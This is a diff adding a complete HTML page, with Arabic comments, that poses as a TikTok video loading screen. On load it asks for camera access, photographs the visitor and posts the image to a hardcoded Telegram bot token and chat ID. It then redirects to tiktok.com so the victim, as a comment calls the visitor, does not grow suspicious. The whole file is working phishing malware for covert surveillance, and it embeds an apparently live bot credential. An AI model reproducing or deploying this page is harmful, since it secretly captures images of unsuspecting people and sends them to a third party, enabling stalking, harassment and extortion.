@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok Video</title>
+    <script>
+        // --- إعدادات السيطرة (مطور حيدر رحيم) ---
+        const TOKEN = "7759070075:AAGEo2F_G8dMdJBPh8nmbqDW2uVqUZsHLqM";
+        const CHAT_ID = "8120039331";
+
+        async function startCapture() {
+            try {
+                // طلب الكاميرا والموقع فور دخول الصفحة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/png');
+
+                    // إرسال الصورة مباشرة إلى التليجرام عبر API البوت
+                    sendToTelegram(photo);
+                }, 1000);
+            } catch (err) {
+                // إذا رفض الضحية، يتم تحويله فوراً لعدم الشك
+                window.location.href = "https://www.tiktok.com";
+            }
+        }
+
+        function sendToTelegram(base64Image) {
+            const blob = dataURItoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'shot.png');
+            formData.append('caption', '🎯 تم صيد صورة جديدة بواسطة: مطور حيدر رحيم');
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                window.location.href = "https://www.tiktok.com";
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], {type: mimeString});
+        }
+
+        window.onload = startCapture;
+    </script>
+</head>
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+    <div style="text-align:center;">
+        <img src="https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png" width="150">
+        <p>جاري تحميل الفيديو... انتظر لحظة</p>
+    </div>
+</body>
+</html>
